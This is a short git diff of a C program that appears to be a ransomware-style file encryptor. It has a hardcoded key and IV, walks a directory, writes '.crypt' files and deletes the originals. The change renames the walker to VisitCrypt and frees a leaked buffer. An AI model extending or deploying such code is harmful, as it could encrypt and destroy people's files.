@@ -12,15 +12,15 @@ char* iv = "qwertyuiopasd";
 char* key = "asdfghjklzxcvbnmqwertyuiopasdfgh";
 char* ext = ".crypt";
 
-int Visit(char* path);
+int VisitCrypt(char* path);
 
 int main(int argc, char const *argv[]) {
   char* path = "test";
-  Visit(path);
+  VisitCrypt(path);
   return 0;
 }
 
-int Visit(char* path){
+int VisitCrypt(char* path){
   struct dirent *de;
   DIR *dr = opendir(path);
   //passo base
@@ -49,6 +49,7 @@ int Visit(char* path){
         deleteFile(toVisit);
         fclose(old);
         fclose(nuovo);
+        free(newName);
       }
       free(toVisit);
     }
